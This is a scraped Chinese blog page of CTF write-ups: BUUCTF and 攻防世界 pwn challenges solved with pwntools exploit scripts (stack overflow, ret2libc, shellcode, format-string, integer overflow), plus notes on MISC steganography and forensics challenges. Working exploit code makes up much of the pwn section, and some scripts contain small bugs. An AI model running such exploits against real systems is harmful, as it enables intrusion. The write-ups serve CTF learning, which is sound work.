)offset = 0x38exit_addr = 0x0804E6A0flag_addr = 0x080489A0a1 = 814536271a2 = 425138641payload = offset * b&#x27;a&#x27; + p32(flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)io.sendline(payload)io.interactive() EX在看到师傅们的WP，明白了新的暴力解题方法 bjdctf_2020_babystack知识点：栈溢出 整数溢出 终于碰上个简单题了，注意本题后面的补充有新知识点！ 查看保护措施 ida伪代码 主函数让我们先输入一个值，再将这个值作为read函数的输入限制，但并不妨碍我们进行栈溢出 我们再看其它函数，发现了一个叫backdoor的函数 这个函数也确实没有欺骗我们，后门函数确实存在！ 我们只需要输入一个较长的数值，保证buf被覆盖，同时，输入返回地址即可，但别忘了，本题与前面的有一点不同，是64位的，因此rbp占8字节 我们查看buf大小 构造exp 123456789101112131415from pwn import *context.arch = &quot;amd64&quot;io = process(&#x27;/home/w/桌面/bjdctf_2020_babystack&#x27; )backdoor = 0x4006e6p.sendlineafter(&quot;Please input the length of your name:\\n&quot;, &quot;50&quot;)payload = b&#x27;a&#x27; * (0x10 + 8) + p64(backdoor)io.sendline(payload)io.interactive() 整数溢出（部分）在写完本题查看其它师傅写的WP时，发现了这个题的进阶体 此题大致思路（甚至是WP）都与上题相差不多，但是对输入的值，即read的范围做出要求，即不能大于10，而单单buf的地址就已经比10多了，我们该怎样，才能绕过这一层判断呢？答案就是整数溢出 在计算机中。有符号数用二进制表示。表示负数的时候。将二进制最高为来表示数字的符号，最高为是1就是负数。最高位是0就表是正数，当有符号数溢出时。会从最小的值开始，-xxxxx然后依次+1。 既然有“有符号数”，当然也存在着“无符号数”，他们的范围如下 其危害主要有以下几点 （1）数据截断：当发生溢出时。数据会被截断 a\\b\\r为3个8位无符号整数。范围大小为0-255a = 11111111b = 00000001r = a + b = 100000000由于a和b相加的值超出了8位。发生溢出。截取8位。r就变成了0 （2）宽度溢出：当一个较小宽度的操作数被提升到了较大操作数一样的宽度。然后进行计算。如果计算结果放 在较小宽度那里那么长度就会被截断为较小宽度。 比如一个32位的运算结果。放到了16位寄存器。那么就会取后16位 （3）改变符号：有符号整数溢出时。就会改变正负。 0x7fffffff + 1 = 0x80000000 = - 2147483648 （4）无符号与有符号转换：将有符号数赋给无符号数后。会从-1变成无符号数的最大数 当把无符号数赋给有符 号数，会从无符号数最大数变成-1、 因此在本题中，我们利用整数漏洞 nbytes 为4字节的 signed int 类型(有符号数)，read 的输入限制为 unsigned int 类型(无符号数)，因此，一种想法，我们可以输入”-1”，躲过检查，同时-1就会变成unsigned int的最大值；第二种想法，我们可以输入 =&gt; 2147483649，signed int 类型被当做负数小于10，read函数中 unsigned int 类型被当成正整数 2147483649 ciscn_2019_en_2跟“ciscn_2019_c_1“基本一样 ，pass not_the_same_3dsctf_2016本题大致思路与not_the_same_3dsctf_2016，类似，不同的是，本题在找引用flag的函数地址时，发现并没有读取的函数 因此我们要在退出之前通过write()函数进行输出，需要注意的是，write()需要三个参数，而其第二个为要读的内容，所以我们还需要找到flag的地址 exp如下： 1234567891011121314151617from pwn import *io = remote(&#x27;node4.buuoj.cn&#x27;, 28286)#io = process(&#x27;/home/w/桌面/not_the_same_3dsctf_2016&#x27; )offset = 45exit = 0x0804E660write = 0x806E270secret = 0x080489A0flag = 0x080ECA2Dpayload = b&#x27;a&#x27; * offset + p32(secret) + p32(write) + p32(exit) + p32(1) + p32(flag) + p32(100)io.sendline(payload)io.interactive() [HarekazeCTF2019]baby_rop 打开ida查看 主函数已经将system函数给了我们，此外，我们还可以搜到/bin/sh字符串，确实是一道简单的rop 由于这是64位程序，我们想将/bin/sh作为system的参数，就必须要先将字符串存放进rdi寄存器中，再通过寄存器传进system 查找rdi EXP如下： 12345678910111213from pwn import *io = process(&#x27;./babyrop&#x27;)sys_addr = 0x400490binsh_addr = 0x60104Brdi_ret = 0x400683payload = (0x10 + 8) * b&#x27;a&#x27; + p32(rdi_ret) + p32(binsh_addr) + p32(sys_addr)io.sendline(payload)io.interactive() ciscn_2019_n_5知识点：栈溢出 re2shellcode 查看保护措施 ida查看伪代码 由于本题没有开任何保护措施，同时缺少system和·binsh，我们有两种思路，一种是前面的retlibc，另一种是更为简单的retshellcode，鉴于此WP目前还没有出现retshellcode，本题我采取此种方法解决 我们的思路分为两步， 一、向name注入生成的shellcode 在进行操作之前，我们先查看name所处的内存空间的读写权限 name所在的位置可读可写 二、通过gets返回name地址执行shellcode 查看栈溢出需要的垃圾字节数 以下是exp 1234567891011121314151617from pwn import *context.arch = &quot;amd64&quot;io = process(&#x27;/home/w/桌面/ciscn_2019_n_5&#x27; )shellcode = asm(shellcraft.amd64.linux.sh())io.sendlineafter(&quot;tell me your name\\n&quot;, shellcode)name_addr = 0x601080payload = b&#x27;a&#x27; * (0x20 + 8) + p64(name_addr)io.sendlineafter(&quot;What do you want to say to me?\\n&quot;, payload)io.interactive() others_shellcode直接nc（疑惑），pass ciscn_2019_ne_5先checksec 32位，只开了NX保护 ida查看main函数 **这里用ida来F5查看main函数报错了，大概率是不知道call去哪里了，根据错误提示找到call，点进函数F5，再点回main函数就好了（雾** 以下是漫长复杂的主函数 尽管代码又臭又长，但是逻辑很清晰：输入正确的管理员密码（代码已经将密码给出了），当登陆账户之后，你就有权进行三（隐藏的四）个操作 主函数并没有明显的突破点，我们将目标转换到引用的函数中，前三个函数都没有什么值得注意的地方，而第四个“Get Flag”几乎是明示这里有“问题”了 这里有个进行复制的strcpy函数，我们分别查看src和dest的大小 src： dest： dest大小只有48，比src小不少，所以，这里的复制可以用来制造栈溢出 查找system和/bin/sh 很遗憾，只有system 需要注意的是，只取sh也可以作为参数执行命令，而我们发现了名为“fflush”的字符串，在其地址（0x080482E6）加四，即为sh地址 b’a’*4 + p32(0x080482EA) exp如下： 12345678910111213141516from pwn import *io = process(&#x27;...&#x27;)# 登录io.sendlineafter(&quot;Please input admin password:&quot;,&#x27;administrator&#x27;)# 提前构造payloadpayload = b&#x27;a&#x27; * (0x48 + 8) + p32(0x080484D0) + b&#x27;a&#x27;*4 + p32(0x080482EA)# 操作io.sendlineafter(&quot;Input your operation:&quot;,&#x27;1&#x27;)io.sendlineafter(&quot;Please input new log info:&quot;,payload)io.sendlineafter(&quot;Input your operation:&quot;,&#x27;4&#x27;)io.interactive() 铁人三项(第五赛区)_2018_rop知识点：栈溢出 re2libc 先查看保护措施 只开了NX保护 ida查看伪代码 查看各个函数 可以发现，在vulnerable_function函数中，buf占0x88空间，而我们要输入的为0x100u，明显多于buf的空间，可以在此进行栈溢出 看完主函数，并没有特别明显的思路，查看一下字符串 也没有system和\\bin\\sh，这应该是libc类型，我们需要通过泄露write函数的地址对system和\\bin\\sh地址进行计算 exp: 1234567891011121314151617181920212223242526from pwn import *from LibcSeacher import *io = process(&#x27;...&#x27;)elf = ELF(&#x27;...&#x27;)main_addr = 0x80484c6write_plt = elf.plt[&#x27;write&#x27;]write_get = elf.got[&#x27;write&#x27;]payload1 = b&#x27;a&#x27; * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)io.sendline(payload1)write_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:].ljust(4,&quot;\\x00&quot;))# write_addr=u32(r.recv(4))libc = LibcSeacher(&#x27;write&#x27;, write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27; * (0x88 + 4) + p32(system_addr) + p32(binsh_addr)io.sendline(payload2)io.interactive() 解释： 主要思路 —— 利用write的plt泄漏write函数的真实地址。通过write函数在libc中的相对偏移量计算libc的基地址 而payload1中，p32(main_addr)后面的内容，就是write的参数（我们就是通过write函数自己来泄露它的实际地址），在这里，我们重新复习一下write函数 ssize_t write(int fd,const void*buf,size_t count); 参数说明： fd：是文件描述符（write所对应的是写，即就是1） buf：通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 bjdctf_2020_babystack2haha，写这题的时候发现以前好像写过，往前翻了翻，果然有，这题分析步骤与bjdctf_2020_babystack区别不大，这里只放py了哈 exp1： 1234567891011121314from pwn import *context.arch = &quot;amd64&quot;io = process(&#x27;/home/w/桌面/bjdctf_2020_babystack2&#x27; )backdoor = 0x400726payload = b&#x27;a&#x27; * (0x10 + 8) + p64(backdoor)io.sendlineafter(&quot;Please input the length of your name:\\n&quot;, &#x27;-1&#x27;)io.sendlineafter(&quot;What&#x27;s u name?\\n&quot;, payload)io.interactive() 错误的exp： 1234567891011121314from pwn import *context.arch = &quot;amd64&quot;io = process(&#x27;/home/w/桌面/bjdctf_2020_babystack2&#x27; )backdoor = 0x400726payload = b&#x27;a&#x27; * (0x10 + 8) + p64(backdoor)io.sendlineafter(&quot;Please input the length of your name:\\n&quot;, &#x27;0x80000001&#x27;)io.sendlineafter(&quot;What&#x27;s u name?\\n&quot;, payload)io.interactive() 在这里我们尝试使用第二种思路构造payload，但是始终不能打通，在动态调试中我们 jarvisoj_fm知识点：栈溢出 格式化字符串 第一步，checksec 开了canary，意味着会有随机数阻碍我们进行栈溢出 第二步，查看主函数 内置system，让我们很高兴，但是因为canary保护的存在，我们是不能通过直接进行栈溢出改写x的值的，我们观察函数上方，发现了printf(&amp;buf)并没有对输出的值进行限制，因此我们想到使用格式化字符串漏洞的知识点 要构造exp，我们必须知道偏移量，我们利用printf去求 方法一 方法二 偏移量为11 构造exp如下： 1234567891011from pwn import *io = io = process(&#x27;/home/w/桌面/fm&#x27; )x_addr = 0x0804A02Cpayload = p32(x_addr) + &#x27;%11$n&#x27;io.sendline(payload)io.interactive() 在这里解释下payload，我们通过%11$n定位到了偏移值为11的位置，并向其写入数据，而正如我们所知，%n会写入到目前为止所写的字符数，而写入数据正是由%11$n前面的参数的长度决定的，而我们传入的x的地址，恰好是4字节（位），因此不需要添加a来补齐位数即可直接利用，将x参数改为4 需要a的情况 格式化字符串上一题地址：[第五空间2019第五主题]PWN5 碰到两个格式化字符串漏洞的题目之后，也有了一些心得体会，在这里记录 参考资料：https://www.wlhhlc.top/posts/17489/ （dota爷真的写的很好！！！） 一、原理与常用函数 格式化字符串函数是将计算机内存中表示的数据转化为我们人类可读的字符串格式，可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。 函数 介绍 printf 输出到 stdout fprintf 输出到指定 FILE 流 vprintf 根据参数列表格式化输出到 stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置 argv syslog 输出日志 err, verr, warn, vwarn 等 …… 由于printf较为常用，这里补充一下printf的参数： %d : 十进制 - 输出十进制整数 %s : 字符串 - 从内存中读取字符串 %x : 十六进制 - 输出十六进制数 %c : 字符 - 输出字符 %p : 指针 - 指针地址 %n : 到目前为止所写的字符数 二、泄露内存 泄露任意内存地址在这里一般是为了寻找偏移量，这里在[第五空间2019第五主题]PWN5中已经做过三种方法的介绍。 在这里根据dota爷的blog，补充一下泄露栈内存的小结 利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。 利用 %s 来获取变量所对应地址的内容，只不过有零截断。 利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。 三、覆盖内存 覆盖栈内存 覆盖栈内存我们常用%n，只要变量对应地址可写，我们就可以通过格式化字符串来改变其对应的值 利用步骤如下： 1、确定覆盖地址2、确定相对偏移 3、进行覆盖 覆盖任意内存的地址 覆盖小数字 覆盖大数字 一次性输出大数字字节来进行覆盖，这样基本不会成功，因为太长了，所以我们需要另辟蹊径。首先我们需要了解一下变量在内存中的存储格式： 首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \\ x78\\x56\\x34\\x12。 所以我们想要覆盖成0x12345678，需要依次为\\x78\\x56\\x34\\x12 接下来我们需要利用到以下字符串格式标志 1234hhn : 写入一字节hn : 写入两字节l : 写入四节写ll : 写入八字节 也就是我们需要使用 hhn 一个字节来逐次写入，再配合%nx会返回16进制数来构造exp pwn2_sctf_2016checksec 只开了NX main函数啥也没有，跳进了vuil()函数 查看一下get_n() 可以发现，与上面的libc不同，出题人自定义了一个输入函数。 查看字符串 没有system和bninsh，大概率是libc了，但是我们发现vuin()函数中存在着一层判断，使我们无法填进足够长的数据进行栈溢出。 而前文中的自定义输入函数get_n()，就在这时起到了作用get_n，它接受了a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果，这即是我们前面遇到过的整数溢出 思路： 输入负数，整数溢出 利用printf()实现libc 覆盖返回地址并执行system(&#39;/bin/sh&#39;) exp: 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSeacher import *io = process(&#x27;./pwn2_sctf_2016&#x27;)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)# 第一步io.recvuntil(&#x27;How many bytes do you want me to read?&#x27;)io.sendline(&#x27;-1&#x27;)# 第二步main_addr = elf.sym[&#x27;main&#x27;]printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]payload_1 = b&#x27;a&#x27; * (0x2c + 4) + p32(printf_plt) + p32(main_addr) + p32(printf_got)io.recvuntil(&#x27;\\n&#x27;)io.sendline(payload_1)io.recvuntil(&#x27;\\n&#x27;)# 第三步printf_addr = u32(io.recv(4))libc = LibcSeacher(&#x27;printf&#x27;, printf_addr)base = printf_addr - libc. dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)binsh_addr = base + libc.dump(&#x27;str_bin_sh&#x27;)payload_2 = b&#x27;a&#x27; * (0x2c + 4) + p32(system_addr) + p32(main_addr) + p32(binsh_addr)io.recvuntil(&#x27;How many bytes do you want me to read?&#x27;)io.sendline(&#x27;-1&#x27;)io.recvuntil(&#x27;\\n&#x27;)io.sendline(payload_2)io.interactive()","categories":[],"tags":[{"name":"Pwn入门","slug":"Pwn入门","permalink":"https://0410wzn.top/tags/Pwn%E5%85%A5%E9%97%A8/"}]},{"title":"BUUCTF_MISC_WP(更新ing)","slug":"BUUCTF-MISC-WP-更新ing","date":"2021-12-08T14:14:59.000Z","updated":"2022-03-25T14:31:50.534Z","comments":true,"path":"2021/12/08/BUUCTF-MISC-WP-更新ing/","link":"","permalink":"https://0410wzn.top/2021/12/08/BUUCTF-MISC-WP-%E6%9B%B4%E6%96%B0ing/","excerpt":"","text":"BuuCTF杂项WP https://buuoj.cn/challenges 金三胖下载附件如下： 仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧： 答案显而易见对吧！ 二维码下载附件如下： 别怕，扫描一下： 很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析 果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破 解压，拿到flag！ 你竟然赶我走！hahaha，看看附件： 没啥可说的，010或者hex一看有惊喜 有N种方法解决呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现 .png) 编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！ 扫一扫，得到答案！ 大白下载附件如图： 又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！ 根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍 PNG文件分析 基础破解emmm…都提示暴力破解了，那就乖乖暴力破解吧。 嘿嘿嘿🤭，爆破出来了！ 解压文件，得到一段base64编码，转换即有flag！ 乌镇峰会种图图片里有啥信息？没啥好吧，010或者hex一看就ok 文件中的秘密emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。 LSBlsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形： Data Extract 提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可 Wireshark分析流量包，自然是使用wireshark了！ emmm…该看啥啊？ 划重点经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选筛选语句如下： http.request.method==POST 只有一条！追踪其TCP流即可找到password，即flag rar告诉4位数字了，爆破就完了呗，拜拜 zip伪加密压缩包文件分析： 依据上述知识点，我们打开010 发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag qr真就是：“二维码，谁用谁知道”，拜拜~ 被嗅探的流量提到流量分析，自然又是wireshark！ 过滤 flag出来了。 镜子里面的世界这个题啊，镜子里面啊，想隐写啊。（010、binwalk找不出啥来才想的🐶,） LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ningen得到图片，010和属性都没看出啥，于是binwalk，发现图片里面存在一个压缩包，提取即可。 提取出来，爆破即可。 里面的文档即使flag 小明的保险箱,,,跟上一个题不能说完全相似也只能说一模一样了，密码放在下面，溜了 爱因斯坦拿到题后，习惯性看一下属性，发现有一点值得注意的地方 暂且放下，之后010看一看，binwalk看一看，出来个压缩包，唉唉，没密码怎么办？？？ 抱着试一试的想法，填上备注的信息，有惊喜哦，哎嘿。 easycapemmm…全都是TCP流有啥意思，我一个基本不会使wireshark的萌新直接追踪一下流flag就出来了、、、 隐藏的钥匙呐呐呐，属性、010，wait！010真的找出了东西哎！ 依据提示，base64转码即可 另外一个世界属性，010，这次，我们又在010里找到了不寻常的地方 一串2进制编码！ 解码即可。 FLAG 在属性、010、binwalk无果后，我们来试试stegsolve，盲猜lsb（我只知道这个🐕） 左面似乎啥也没有，但我们在右面发现了重头戏！504B0304，不是压缩包的文件头吗！！！果断将其保存为哦压缩文件，暂且无视bandizip的损坏提醒，解压下来堪堪——这是啥？？？！！！ 一头雾水的我选择使用file命令辨别其文件类型 elf文件，这真的是道misc，不是pwn？？？ ida打开，堪堪main函数，神奇的事情出现了！ ok，解决了 假如给我三天光明ctfer当真啥都要会啊。。。 别问，问就是盲文 解出来是“kmdonowg”，很明显是解压码，解压音频，拖入audacity，观察波形图 别问，问就是摩斯电码（一边对着一边打，眼要瞎了） -.-. - ..-. .— .—. . .. ——- —-.. —… …— ..—- ..—.. ..—- …— -.. —.. 线上解码即可 神秘龙卷风依照题目所给信息爆破 打开压缩包文本，发现神秘龙卷风 很明显是brainfuck，在线解码即可 后门查杀后门查杀，就查杀后门呗😓 题目已经提醒了密码即为flag，搜索pass，即可找到 数据包中的线索题目要交流内容，交流内容大概率是文本，因此我们把目标放在http协议上，过滤后，得到了以下四个。 emmm，接下来我是一个个看的😂，最后在返回页面的那个流里发现了不同的东西—好长一段编码 bae64解码，flag出现 荷兰带宽数据泄露下载附件之后得到.bin文件，起初并不知道该怎么看，经过查找资料、例题之后，发现这是一个路由器信息恢复类问题，答案可能是username或者password，ctrl+F，果然是username。 来首歌吧音频隐写，拖进audacity， 明显的摩斯 … -… -.-. ——. …— … -… …- ——. -.-. -… ——- .—— —… —… …-. … …— . -… .—— —… -… —… ——- ——. …— ——. .—— ——. .—— -.-. 在线转码即可出flag Webshell后门emmm，这题和上面的某个题不能说一模一样，也只能说基本类似了，是哪个题我不说🤐 面具下的flag属性里有ps，打开之后无果，010没有思路，最后使用binwalk，发现了压缩包！ 但当我们兴高采烈的准备爆破时 为什么呢？—— 联系前面做题的经验，我们猜测是伪加密 果然是，我们将其更改，如上图 在试过多种方法后，我仍然一头雾水，最终在wp的帮助下解决此题（惭愧） 原来是把文件当压缩文件！ 7Z命令 可以发现，文件就在其中一个压缩包里，密码爆破没给提示，只能从图片入手了，但是，属性、010、binwalk在图片里都没发现有用的东西，最终还是借助wp才做出这道题 提取出了多个文件夹，其中两个明显提示有flag one two 解码即可 九连环下载好图片后，属性没提示，但在010里搜flag发现了一些东西 估计flag就在这个文档里，走，上binwalk！ 里面果然还有东西，把他们都提取出来 steghide的使用 steghide的使用 使用后，我们发现，出现了“ko.txt”这个文件，而它正是压缩包的密码，解压后，打开文档，本题结束。 被劫持的神秘礼物wireshark查看，从题目中“MD5”和“哈希”一下，我们可以推测我们要找的大概率是文本，因此我们优先追踪http流，果然不出所料。 嗯，然后随波逐流哈希一下，嗯 此即为flagヾ(≧▽≦*)o 刷新过的图片提到键盘上的刷新，自然想到F5键，由此我们确定了本题的隐写方式——F5隐写 F555 java Extract “待提取的图片路径” 即会提取出其中文件，如下： 我们查看解出的文件，发现一堆乱码，便怀疑不是文本文件，于是用file一看，果然不是 拖到win里更改后缀，发现解压需要解压码，于是去爆破 为什么没有文件？—— 依照前面的经验，怀疑是伪加密 果然是 解出来了！！！睡觉！！！ Snake属性没啥东西哦，然后堪堪010，结果发现以下·信息 但是——没啥用，还是老老实实binwalk吧 提取出的文件如下所示 cipher里一堆乱码，看key，key里是如下文本 V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo= 明显的base64，解码得 What is Nicki Minaj’s favorite song that refers to snakes? 想来应该key是Anaconda(水蚺—南美洲蟒蛇)，但问题又来了，这是个什么编码？？？ 最后经过查看WP，才知晓，这是一种名为“Serpent (蛇; 尤指大蛇;)”，合着这题真就snake了 Serpent 在线解码网址：http://serpent.online-domain-tools.com/ flag解出。 认真你就输了下载得到xls文件，打开时提示文件错误，于是用010一看 有戏！！！ binwalk -e一下，压缩包没加密，解压完找到文件即可 藏藏藏属性、010都没啥，用binwalk发现有zip，解压即可得到二维码 被偷走的文件又是流量分析，祭出wireshark，根据题目所给提示我们应该查找ftp来看文件传输，如下所示 将文件提取出来，目标即是rar文件，因此使用binwalk命令进行分解，得到压缩包，需要密码？ 爆破即可 此题结束。 菜刀666 菜刀与一句话木马有个菜刀叫中国菜刀，有个木马叫一句话木马，因为隐蔽且传输量大，一般工具都是POST方式传参，所以一句话一般写_POST，把这个一句话木马挂到一个网页上，用‘菜刀’连接这一句话木马，一旦它运行，凭借这一句话木马就可以获取网站的管理权限。 由上可知，我们需要看其post，直接追踪http流 发现了好东西！ 佛系青年压缩包直接打不开？爆破不显示文件？ 应该是伪加密吧。 、 果然是！ 提取压缩包之后，我们发现有文本文件 与佛论禅！！！ 论完了，出来了 你猜我是个啥压缩包打开显示格式错误，直接上010堪堪，惊喜出现了！ 神奇的二维码这个题…恶心人！！！ 先扫描神奇的二维码 嗯，神奇之处其在于它一点都不神奇，010无事，上binwalk 提取出来之后（做完再写的wp，可能有的删了） encode内容如下： YXNkZmdoamtsMTIzNDU2Nzg5MA== 明显的base64，解码如下： asdfghjkl1234567890 用这个我们能解压出另一个文件（好像是文档？） 然后最讨厌的第一个地方来了，里面是一段超~长的base64，接下来解码极其烦人，大约套了20层，下面展示两张 出来的——还不是flag！！！ 解压音频文件，au一看 呦，这不是最——最讨人厌的摩斯吗？？？！！！🐶 消耗眼睛手打 –/—/.-./…/./…/…/…-/./.-./-.–/…-/./.-./-.–/./.-/…/-.– 网站解码即可，flag出现！！！ morse2ascii看wp时发现，大佬是这样做的： BASECRACK！原来有个工具叫basecrack！！！ 一叶障目解压文件后，PNG图片能够正常打开，属性也没问题，用010堪堪 提示这个 经查找，发现这个错误一般都是修改宽高造成的，所以我们修改宽高 ok just_a_rar解压——爆破——解压——属性——flag 鸡你太美下下来之后，发现两个后缀都为gif的附件，属性没有问题，打开010查看，发现副本报错，因为都是gif文件，对比后发现副本没有文件头，添加上去，即可 穿越时空的思念拖入au 思路一：不就是摩斯？直接手打，解码即可 思路二：分离声道，kali分析（没想起来，做完看的WP哈哈哈） 纳尼属性无问题，文件打不开，堪堪010，果然，缺少文件头，补上，可以打开。 动图内容如下 Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0= 明显的base64，解码即可 outguessoutguess安装： git clone https://github.com/crorvick/outguess] cd进文件夹 ./configure &amp;&amp; make &amp;&amp; make install 使用： outguess -k 密钥 -d 文件名 存放文件 下载下来之后先看属性， 明显的社会主义核心价值观编码 经过查找后，我们发现outguess是一种隐写方式 excel爆破直接打开文件显示需要密码，选择改变文件后缀名，打开txt，发现内容不少 直接搜索flag，查到 [HBNIS2018]来题中等的吧 很明显是摩斯码，解码 大写不行，试了试小写的，就过了。。。 [GXYCTF2019]gakki图片本身什么注意点，binwalk提取压缩包，爆破四位弱密码，得到如下 木大思路，慕达思路！！！！！！最后得知了是用字符统计 字符统计12345678910111213141516alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\\\&#123;\\\\&#125;[]&quot;string = open(&#x27;./flag.txt&#x27;).read()result = &#123;&#125;for i in alphabet: counts = string.count(i) i = &#x27;&#123;0&#125;&#x27;.format(i) result[i] = countsres = sorted(result.items(), key = lambda item: item[1], reverse = True)for data in res: print(data)for i in res: flag = str(i[0]) print(flag[0], end = &quot;&quot;) [WUSTCTF2020]find_me附件属性，盲文解密，pass [ACTF新生赛2020]base64隐写扫码，无用，看，文档，base64，隐写，上，脚本（大佬写的） base641234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;3.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() [SWPU2019]伟大的侦查压缩包的密码文件可以解压，打开发现 010改改编码多看几次，最后发现是EBCDIC 解压出如图图片，《跳舞的小人》 让我们打开《福尔摩斯》，开始解密！ 最后解出来为 flag{iloveholmesandwllm} [GUET-CTF2019]KO打开之后是ook编码，直接解码即可 网址： https://www.splitbrain.org/services/ook 黑客帝国打开文件，发现rar文件头 直接改后缀打开报错，在经过查询之后（太菜了对博起😭），错因如下（大佬写的！） 没有完全理解编码，txt上显示的数字与010中显示的十六进制是不一样的。010中的编码是将txt中的内容用Ascll码编码后的结果，如图：txt中显示的52617221到了010中编码为35 32 36 31 37 32 32 31。而文件头是指转换为16进制Ascll码后的数值。所以，本题应该将txt写入rar文件。 写入脚本如下： 12345678910import structa = open(&quot;hei.txt&quot;,&quot;r&quot;)#十六进制数据文件lines = a.read()res = [lines[i:i+2] for i in range(0,len(lines),2)]with open(&quot;hei.rar&quot;,&quot;wb&quot;) as f: for i in res: s = struct.pack(&#x27;B&#x27;,int(i,16)) f.write(s) 爆破出来的压缩包密码 打开后是一个无法直接打开的png图片，010打开后，直接搜索没有搜到有效信息，仔细观察16进制，头不对尾， 我们将文件头改为jpg的之后， 就可以成功打开了","categories":[],"tags":[{"name":"MISC","slug":"MISC","permalink":"https://0410wzn.top/tags/MISC/"}]},{"title":"攻防世界PWN新手区WP（长期更新）","slug":"攻防世界PWN新手区WP（长期更新）","date":"2021-11-17T11:02:54.000Z","updated":"2021-12-09T03:39:11.852Z","comments":true,"path":"2021/11/17/攻防世界PWN新手区WP（长期更新）/","link":"","permalink":"https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/","excerpt":"","text":"攻防世界PWN新手区WP（长期更新） 题目地址：https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0 一、get_shell 获取靶场,nc登上查看即可， 二、Hello pwn! 首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。 嗯，只开了NX，好耶！ 接下来用64位的ida打开分析逻辑，如下图 看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。 明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下： 1234567891011from pwn import *context.arch = &quot;amd64&quot;p = remote(&#x27;地址&#x27;， 端口)payload = b&#x27;a&#x27; * (0x60106C - 0x60106C) + p64(1853186401)io.sendlineafter(&quot;bof\\n&quot;, payload)io.interactive() 运行，皆大欢喜。 三、level0 先用checksec看一下文件位数和保护措施，如下图 依旧是只有NX开了，题目应该比较简单 将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数， 发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数 发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下： 12345678910111213from pwn import *context,arch = &quot;amd64&quot; // 切换环境io = remote(&#x27;地址&#x27;, 端口)callsystem = 